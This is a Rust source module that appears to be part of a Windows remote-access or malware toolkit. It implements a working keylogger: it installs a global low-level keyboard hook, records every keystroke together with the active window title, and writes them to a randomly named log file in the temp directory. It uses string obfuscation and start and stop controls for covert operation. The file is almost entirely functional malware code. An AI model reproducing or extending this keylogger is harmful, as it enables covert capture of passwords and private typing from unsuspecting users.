use anyhow::{Context, Result, bail};
use winapi::um::winuser::*;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::processthreadsapi::GetCurrentThreadId;
use winapi::shared::minwindef::{WPARAM, LPARAM, LRESULT};
use std::ptr;
use std::sync::OnceLock;
use std::path::{PathBuf, Path};
use std::sync::atomic::{AtomicBool, Ordering};
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use tokio::sync::oneshot;
use tokio::io::AsyncWriteExt;
use tokio::sync::mpsc;
use std::sync::Mutex;
use std::io::Write;

use crate::modules::random;
use crate::obfuscate;

static SHIFT_PRESSED: AtomicBool = AtomicBool::new(false);
static CAPSLOCK_PRESSED: AtomicBool = AtomicBool::new(false);
static THREAD_ID: OnceLock<u32> = OnceLock::new();
static LOG_TX: Mutex<Option<mpsc::UnboundedSender<KeyEvent>>> = Mutex::new(None);

struct KeyEvent {
    key : String,
    window : String 
}

fn install_hook() -> Result<()> {

    unsafe {
        // Storing the thread ID so can trigger the shutdown :)
        THREAD_ID.set(GetCurrentThreadId()).ok();
        let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), ptr::null_mut(), 0);

        if hook.is_null() {
            let e = format!("{} 0x{:08X}", obfuscate!("Failed to install hook : "), GetLastError());
            bail!(e);
        }

        let mut msg: MSG = std::mem::zeroed();
        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {};

        UnhookWindowsHookEx(hook);
    }

    Ok(())
}


/*
HOOKPROC Hookproc;

LRESULT Hookproc(
       int code,
    [in] WPARAM wParam,
    [in] LPARAM lParam
){...}
*/

unsafe extern "system" fn hook_proc(code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    
    if code < 0 {
        return CallNextHookEx(ptr::null_mut(), code, w_param, l_param);
    }

    let key_event = &*(l_param as *const KBDLLHOOKSTRUCT);     
    
    // Checking the shift key!
    if key_event.vkCode == 0x10 || key_event.vkCode == 0xA0 || key_event.vkCode == 0xA1 {
        if w_param == WM_KEYDOWN as usize {
            SHIFT_PRESSED.store(true, Ordering::Relaxed);
        } else if w_param == WM_KEYUP as usize {
            SHIFT_PRESSED.store(false, Ordering::Relaxed);
        }
    }
        
    // Checking Caps Lock
    if key_event.vkCode == 0x14 && (w_param == WM_KEYDOWN as usize || w_param == WM_SYSKEYDOWN as usize) {
        let current = CAPSLOCK_PRESSED.load(Ordering::Relaxed);
        CAPSLOCK_PRESSED.store(!current, Ordering::Relaxed);
    }

    if w_param == WM_KEYDOWN as usize || w_param == WM_SYSKEYDOWN as usize {
        // Map the pressed key
        let key = map_key(key_event.vkCode);
        // Get the window title
        let title = match window_title() {
            Ok(title) => title,
            Err(e) => String::new(),
        };

        // Sending the logging signal
        if let Some(log_tx) = LOG_TX.lock().unwrap().as_ref() {
            let _ = log_tx.send(KeyEvent{key: key, window: title});
        }

        
    };  

    CallNextHookEx(ptr::null_mut(), code, w_param, l_param)
}


fn map_key(vk_code: u32) -> String {

    let shift     = SHIFT_PRESSED.load(Ordering::Relaxed);
    let caps      = CAPSLOCK_PRESSED.load(Ordering::Relaxed);
    let uppercase = shift ^ caps;

    match vk_code {

        0x41 => if uppercase { "A".to_string() } else { "a".to_string() },
        0x42 => if uppercase { "B".to_string() } else { "b".to_string() },
        0x43 => if uppercase { "C".to_string() } else { "c".to_string() },
        0x44 => if uppercase { "D".to_string() } else { "d".to_string() },
        0x45 => if uppercase { "E".to_string() } else { "e".to_string() },
        0x46 => if uppercase { "F".to_string() } else { "f".to_string() },
        0x47 => if uppercase { "G".to_string() } else { "g".to_string() },
        0x48 => if uppercase { "H".to_string() } else { "h".to_string() },
        0x49 => if uppercase { "I".to_string() } else { "i".to_string() },
        0x4A => if uppercase { "J".to_string() } else { "j".to_string() },
        0x4B => if uppercase { "K".to_string() } else { "k".to_string() },
        0x4C => if uppercase { "L".to_string() } else { "l".to_string() },
        0x4D => if uppercase { "M".to_string() } else { "m".to_string() },
        0x4E => if uppercase { "N".to_string() } else { "n".to_string() },
        0x4F => if uppercase { "O".to_string() } else { "o".to_string() },
        0x50 => if uppercase { "P".to_string() } else { "p".to_string() },
        0x51 => if uppercase { "Q".to_string() } else { "q".to_string() },
        0x52 => if uppercase { "R".to_string() } else { "r".to_string() },
        0x53 => if uppercase { "S".to_string() } else { "s".to_string() },
        0x54 => if uppercase { "T".to_string() } else { "t".to_string() },
        0x55 => if uppercase { "U".to_string() } else { "u".to_string() },
        0x56 => if uppercase { "V".to_string() } else { "v".to_string() },
        0x57 => if uppercase { "W".to_string() } else { "w".to_string() },
        0x58 => if uppercase { "X".to_string() } else { "x".to_string() },
        0x59 => if uppercase { "Y".to_string() } else { "y".to_string() },
        0x5A => if uppercase { "Z".to_string() } else { "z".to_string() },
        0x30 => if uppercase { "0".to_string() } else { "à".to_string() },
        0x31 => if shift { "!".to_string() } else { "1".to_string() },
        0x32 => if shift { "@".to_string() } else { "2".to_string() },
        0x33 => if shift { "#".to_string() } else { "3".to_string() },
        0x34 => if shift { "$".to_string() } else { "4".to_string() },
        0x35 => if shift { "%".to_string() } else { "5".to_string() },
        0x36 => if shift { "^".to_string() } else { "6".to_string() },
        0x37 => if shift { "&".to_string() } else { "7".to_string() },
        0x38 => if shift { "*".to_string() } else { "8".to_string() },
        0x39 => if shift { "(".to_string() } else { "9".to_string() },
        0xBA => if shift { ":".to_string() } else { ";".to_string() },
        0xDF => if shift { "§".to_string() } else { "!".to_string() },
        0xBB => if shift { "+".to_string() } else { "=".to_string() },
        0xBC => if shift { "?".to_string() } else { ",".to_string() },
        0xBD => if shift { "_".to_string() } else { "-".to_string() },
        0xBE => if shift { ".".to_string() } else { ";".to_string() },
        0xBF => if shift { "/".to_string() } else { ":".to_string() },
        0xC0 => if shift { "~".to_string() } else { "`".to_string() },
        0xDB => if shift { "{".to_string() } else { "[".to_string() },
        0xDC => if shift { "|".to_string() } else { "\\".to_string() },
        0xDD => if shift { "}".to_string() } else { "]".to_string() },
        0xDE => if shift { "\"".to_string() } else { "'".to_string() },
        0x08 => "[Backspace]".to_string(),
        0x09 => "[Tab]".to_string(),
        0x0D => "[Enter]".to_string(),
        0x10 => "".to_string(), //shift
        0x11 => "[Ctrl]".to_string(),
        0x12 => "[Alt]".to_string(),
        0x14 => "".to_string(), //caps lock
        0x1B => "[Escape]".to_string(),
        0x20 => "".to_string(),
        0x21 => "[PageUp]".to_string(),
        0x22 => "[PageDown]".to_string(),
        0x23 => "[End]".to_string(),
        0x24 => "[Home]".to_string(),
        0x25 => "[Left]".to_string(),
        0x26 => "[Up]".to_string(),
        0x27 => "[Right]".to_string(),
        0x28 => "[Down]".to_string(),
        0x2C => "[PrintScreen]".to_string(),
        0x2D => "[Insert]".to_string(),
        0x2E => "[Delete]".to_string(),
        0x70 => "[F1]".to_string(),
        0x71 => "[F2]".to_string(),
        0x72 => "[F3]".to_string(),
        0x73 => "[F4]".to_string(),
        0x74 => "[F5]".to_string(),
        0x75 => "[F6]".to_string(),
        0x76 => "[F7]".to_string(),
        0x77 => "[F8]".to_string(),
        0x78 => "[F9]".to_string(),
        0x79 => "[F10".to_string(),
        0x7A => "[F11]".to_string(),
        0x7B => "[F12]".to_string(),
        0x60 => "Numpad0".to_string(),
        0x61 => "Numpad1".to_string(),
        0x62 => "Numpad2".to_string(),
        0x63 => "Numpad3".to_string(),
        0x64 => "Numpad4".to_string(),
        0x65 => "Numpad5".to_string(),
        0x66 => "Numpad6".to_string(),
        0x67 => "Numpad7".to_string(),
        0x68 => "Numpad8".to_string(),
        0x69 => "Numpad9".to_string(),
        0x6A => "Multiply".to_string(),
        0x6B => "Add".to_string(),
        0x6C => "Separator".to_string(),
        0x6D => "Subtract".to_string(),
        0x6E => ".".to_string(),
        0x6F => "Divide".to_string(),
        0xA0 => "[LeftShift]".to_string(),
        0xA1 => "[RightShift]".to_string(),
        0xA2 => "[LeftCtrl]".to_string(),
        0xA3 => "[RightCtrl]".to_string(),
        0xA4 => "[LeftAlt]".to_string(),
        0xA5 => "[RightAlt]".to_string(),
        0x5B => "[LeftWin]".to_string(),
        0x5C => "[RightWin]".to_string(),
        0x5D => "[Menu]".to_string(),
        
        _ => format!("[0x{:X}]", vk_code),
    }
}

fn window_title() -> Result<String> {

    unsafe {
        let handle = GetForegroundWindow();
        let lenght = GetWindowTextLengthW(handle);

        let mut window_title = vec![0u16; lenght as usize +1 ];
        GetWindowTextW(handle, window_title.as_mut_ptr(), lenght + 1);
        
        let title = OsString::from_wide(&window_title).to_string_lossy().trim_end_matches("\0").to_string();
        Ok(title)
    }

}

async fn logger(name: PathBuf, mut rx: mpsc::UnboundedReceiver<KeyEvent>) -> Result<()> {
    let mut file = tokio::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(name)
        .await?; 
    
    let mut current_window = String::new();
    while let Some(entry) = rx.recv().await {
        if entry.window != current_window {
            file.write_all(format!("\n=== {} ===\n", entry.window).as_bytes()).await?;
            current_window = entry.window;
        }

        file.write_all(format!("{}\n", entry.key).as_bytes()).await?
    }
    Ok(())

}


pub async fn start() -> Result<String> {

    let (log_tx, log_rx) = mpsc::unbounded_channel();
    *LOG_TX.lock().map_err(|_| anyhow::anyhow!("Failed to lock Mutex!"))? = Some(log_tx);

    let name = format!("{}.log", random::random_name());
    let path = PathBuf::from(std::env::temp_dir().join(&name));
    let path_clone = path.clone();

    tokio::spawn(async move {
        let _ = logger(path_clone, log_rx).await;
    });

    std::thread::spawn(|| {
        let _ = install_hook();
    });

	Ok(path.to_string_lossy().to_string())
}

pub async fn stop() -> Result<()> {
    if let Some(log_rx) = LOG_TX.lock().map_err(|_| anyhow::anyhow!("Failed to lock mutex!"))?.take() {
        drop(log_rx);
    }

    if let Some(thread_id) = THREAD_ID.get() {
        unsafe {
            PostThreadMessageW(*thread_id, WM_QUIT, 0, 0);
        }
    }
    Ok(())
}

